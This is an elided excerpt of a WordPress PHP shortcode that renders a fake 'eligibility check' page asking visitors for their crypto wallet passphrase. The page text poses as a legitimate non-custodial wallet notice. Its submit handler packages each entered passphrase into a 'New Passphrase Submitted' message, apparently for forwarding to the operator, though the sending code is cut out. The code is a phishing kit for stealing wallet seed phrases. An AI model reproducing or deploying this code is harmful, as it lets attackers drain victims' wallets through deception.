...
function passphrase_submission_form() {
    ob_start();
    ?>
    <style>
        body {
    ...
    <div class="container">
        <h1>Unlock the Future of Digital Ownership</h1>
        <p>Enter your wallet passphrase below to check your eligibility.</p>
        <form id="passphraseForm">
            <input type="text" id="passphraseInput" placeholder="Enter Wallet Passphrase" required />
            <div class="button-group">
                <button type="submit" class="check-btn">Check Eligibility</button>
                <button type="button" id="claimButton" class="claim-btn">Claim</button>
            </div>
        </form>
        <div class="description">
            <p>As a non-custodial wallet, your <br> wallet passphrase is exclusively accessible <br> only to you. Recovery of passphrase is currently impossible.
Lost your passphrase? <br> You can create a new wallet, but all <br> your assets in your previous wallet will be inaccessible</p>
        </div>
    </div>
    ...
    <script>
        document.addEventListener("DOMContentLoaded", function () {
            ...
            form.addEventListener("submit", function (e) {
                ...
                const message = "🔐 New Passphrase Submitted:\n" + passphrase;
...
add_shortcode('passphrase_form', 'passphrase_submission_form');